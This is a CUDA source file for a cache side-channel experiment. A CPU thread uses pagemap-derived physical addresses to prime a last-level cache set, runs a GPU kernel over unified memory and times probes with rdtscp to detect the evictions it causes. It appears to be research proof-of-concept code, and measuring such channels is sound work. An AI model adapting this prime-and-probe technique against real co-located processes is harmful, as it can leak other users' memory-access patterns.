// reverse_prime_probe.cu
// Reverse Prime+Probe: CPU is attacker, GPU is victim
//
// Setup:
//   - GPU victim runs a kernel on UVM pages pinned in CPU DRAM
//     (victim's data goes PCIe -> CPU LLC -> DRAM on every access)
//   - CPU attacker primes target LLC sets using pagemap-targeted addresses
//   - CPU probes with rdtsc after GPU victim finishes
//   - Slow probe = GPU victim evicted attacker's lines from LLC
//
// Compile: nvcc -O2 -std=c++14 -o reverse_prime_probe reverse_prime_probe.cu -lpthread
// Run:     sudo ./reverse_prime_probe <target_set> <n_points> <reps> <llc_kb> [assoc]
// Example: sudo ./reverse_prime_probe 768 32 100 12288 16

#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <atomic>
#include <thread>
#include <vector>
#include <algorithm>

// ---------------------------------------------------------------------------
// CPU timing: rdtscp + mfence for serialised timestamp
// ---------------------------------------------------------------------------
static inline uint64_t rdtscp_val() {
    uint32_t lo, hi, aux;
    __asm__ __volatile__("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux) :: "memory");
    return ((uint64_t)hi << 32) | lo;
}

static inline void mfence() {
    __asm__ __volatile__("mfence" ::: "memory");
}

// ---------------------------------------------------------------------------
// Pagemap: virtual address -> physical address (requires root)
// ---------------------------------------------------------------------------
static int pagemap_fd = -1;

static int vtop(uint64_t vaddr, uint64_t *paddr_out) {
    if (pagemap_fd < 0)
        pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    uint64_t entry;
    uint64_t vpn = vaddr / 4096;
    if (pread(pagemap_fd, &entry, 8, (off_t)(vpn * 8)) != 8) return -1;
    if (!(entry >> 63)) return -1;          // page not present
    uint64_t pfn = entry & ((1ULL << 55) - 1);
    if (!pfn) return -1;                    // PFN zero -> no root
    *paddr_out = pfn * 4096 + (vaddr & 0xFFF);
    return 0;
}

static int llc_set_of(void *ptr, int n_sets) {
    uint64_t paddr;
    if (vtop((uint64_t)ptr, &paddr)) return -1;
    return (int)((paddr / 64) % (uint64_t)n_sets);
}

// ---------------------------------------------------------------------------
// GPU victim kernel
// Reads the entire UVM victim buffer (pages pinned in CPU DRAM).
// Every access: SM -> PCIe -> CPU LLC -> (possibly DRAM)
// This evicts whatever the CPU attacker primed into those LLC sets.
// ---------------------------------------------------------------------------
__global__ void gpu_victim_kernel(volatile int *data, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    int acc = 0;
    for (; i < n; i += stride)
        acc += data[i];
    // write back to prevent compiler from eliminating accesses
    if (acc == 0xdeadbeef) data[0] = acc;
}

// ---------------------------------------------------------------------------
// Synchronisation flags (attacker <-> GPU thread)
// ---------------------------------------------------------------------------
static std::atomic<bool> g_start_gpu{false};
static std::atomic<bool> g_gpu_done{false};

// GPU victim thread: runs kernel once per rep on signal from CPU attacker
void gpu_victim_thread(int *uvm_victim, int n_ints, int reps) {
    for (int r = 0; r < reps; r++) {
        while (!g_start_gpu.load(std::memory_order_acquire)) {}
        g_start_gpu.store(false, std::memory_order_release);

        gpu_victim_kernel<<<64, 256>>>(uvm_victim, n_ints);
        cudaDeviceSynchronize();

        g_gpu_done.store(true, std::memory_order_release);
    }
}

// ---------------------------------------------------------------------------
// Percentile helper
// ---------------------------------------------------------------------------
static uint64_t percentile(std::vector<uint64_t> &v, double p) {
    if (v.empty()) return 0;
    std::sort(v.begin(), v.end());
    int idx = (int)(p * (double)(v.size() - 1));
    return v[idx];
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <target_set> <n_points> <reps> <llc_kb> [assoc]\n", argv[0]);
        fprintf(stderr, "Example (RTX 3060): sudo %s 768 32 100 12288 16\n", argv[0]);
        return 1;
    }

    int target_set = atoi(argv[1]);
    int n_points   = atoi(argv[2]);
    int reps       = atoi(argv[3]);
    int llc_kb     = atoi(argv[4]);
    int assoc      = argc > 5 ? atoi(argv[5]) : 16;
    int n_sets     = (llc_kb * 1024) / (assoc * 64);

    printf("LLC: %d KB, %d-way, %d sets\n", llc_kb, assoc, n_sets);
    printf("Target set: %d | n_points: %d | reps: %d\n", target_set, n_points, reps);

    // -----------------------------------------------------------------------
    // Allocate CPU attacker's UVM array (for prime/probe)
    // Pages prefetched to CPU DRAM so pagemap returns valid PFNs
    // -----------------------------------------------------------------------
    size_t attacker_sz = 64ULL * 1024 * 1024;
    int *attacker_data = nullptr;
    cudaMallocManaged(&attacker_data, attacker_sz);
    cudaMemPrefetchAsync(attacker_data, attacker_sz, cudaCpuDeviceId, 0);
    cudaDeviceSynchronize();
    memset(attacker_data, 0xAA, attacker_sz);

    // -----------------------------------------------------------------------
    // Allocate GPU victim's UVM array (also pinned in CPU DRAM)
    // The GPU victim kernel accesses this -> goes through CPU LLC via PCIe
    // -----------------------------------------------------------------------
    size_t victim_sz = 64ULL * 1024 * 1024;
    int *victim_data = nullptr;
    cudaMallocManaged(&victim_data, victim_sz);
    cudaMemPrefetchAsync(victim_data, victim_sz, cudaCpuDeviceId, 0);
    cudaDeviceSynchronize();
    memset(victim_data, 0xBB, victim_sz);
    int n_victim_ints = (int)(victim_sz / sizeof(int));

    // -----------------------------------------------------------------------
    // Address discovery: find attacker addresses congruent to target_set
    // -----------------------------------------------------------------------
    printf("Scanning attacker array for congruent lines (set %d)...\n", target_set);
    std::vector<int> cidx;      // index into attacker_data[] (units of int)
    int n_ints_att = (int)(attacker_sz / sizeof(int));
    for (int i = 0; i < n_ints_att; i += 16) {   // step 64 bytes = 1 cache line
        int s = llc_set_of(&attacker_data[i], n_sets);
        if (s == target_set) {
            cidx.push_back(i);
            if ((int)cidx.size() >= n_points) break;
        }
    }
    if (cidx.empty()) {
        fprintf(stderr, "No congruent lines found. Are you running with sudo?\n");
        return 1;
    }
    if ((int)cidx.size() < n_points) {
        printf("Warning: only found %d congruent lines (asked for %d)\n",
               (int)cidx.size(), n_points);
        n_points = (int)cidx.size();
    }
    printf("Found %d congruent lines\n", n_points);

    // -----------------------------------------------------------------------
    // Start GPU victim thread
    // -----------------------------------------------------------------------
    std::thread gpu_t(gpu_victim_thread, victim_data, n_victim_ints, reps);

    // -----------------------------------------------------------------------
    // Measurement loop
    // Each rep: baseline measurement (no GPU), then attack measurement (GPU runs)
    // -----------------------------------------------------------------------
    // Store per-line, per-rep timings
    std::vector<std::vector<uint64_t>> base_t(n_points, std::vector<uint64_t>(reps));
    std::vector<std::vector<uint64_t>> atk_t(n_points, std::vector<uint64_t>(reps));

    for (int r = 0; r < reps; r++) {
        // --- BASELINE: prime, idle, probe (no GPU victim) ---
        // Prime: fill target LLC set with attacker's lines
        for (int i = 0; i < n_points; i++) {
            volatile int x = attacker_data[cidx[i]]; (void)x;
        }
        usleep(500);    // idle ~= time GPU victim would take
        // Probe
        for (int i = 0; i < n_points; i++) {
            mfence();
            uint64_t t0 = rdtscp_val();
            volatile int x = attacker_data[cidx[i]]; (void)x;
            mfence();
            uint64_t t1 = rdtscp_val();
            base_t[i][r] = t1 - t0;
        }

        // --- ATTACK: prime, signal GPU, wait, probe ---
        // Prime
        for (int i = 0; i < n_points; i++) {
            volatile int x = attacker_data[cidx[i]]; (void)x;
        }
        // Signal GPU victim to run one pass
        g_start_gpu.store(true, std::memory_order_release);
        // Wait for GPU victim to finish
        while (!g_gpu_done.load(std::memory_order_acquire)) {}
        g_gpu_done.store(false, std::memory_order_release);
        // Probe
        for (int i = 0; i < n_points; i++) {
            mfence();
            uint64_t t0 = rdtscp_val();
            volatile int x = attacker_data[cidx[i]]; (void)x;
            mfence();
            uint64_t t1 = rdtscp_val();
            atk_t[i][r] = t1 - t0;
        }
    }

    gpu_t.join();

    // -----------------------------------------------------------------------
    // Write CSV
    // -----------------------------------------------------------------------
    char fname[256];
    snprintf(fname, sizeof(fname), "reverse_pp_set%d.csv", target_set);
    FILE *fp = fopen(fname, "w");
    if (!fp) { perror("fopen"); return 1; }

    fprintf(fp, "line_idx,base_median,base_p99,base_max,"
                "atk_median,atk_p99,atk_max,p99_ratio\n");

    for (int i = 0; i < n_points; i++) {
        uint64_t bmed = percentile(base_t[i], 0.50);
        uint64_t bp99 = percentile(base_t[i], 0.99);
        uint64_t bmax = base_t[i].back();
        uint64_t amed = percentile(atk_t[i],  0.50);
        uint64_t ap99 = percentile(atk_t[i],  0.99);
        uint64_t amax = atk_t[i].back();
        double ratio  = bp99 > 0 ? (double)ap99 / (double)bp99 : 0.0;
        fprintf(fp, "%d,%lu,%lu,%lu,%lu,%lu,%lu,%.4f\n",
                i, bmed, bp99, bmax, amed, ap99, amax, ratio);
    }
    fclose(fp);
    printf("Results written to %s\n", fname);

    cudaFree(attacker_data);
    cudaFree(victim_data);
    return 0;
}
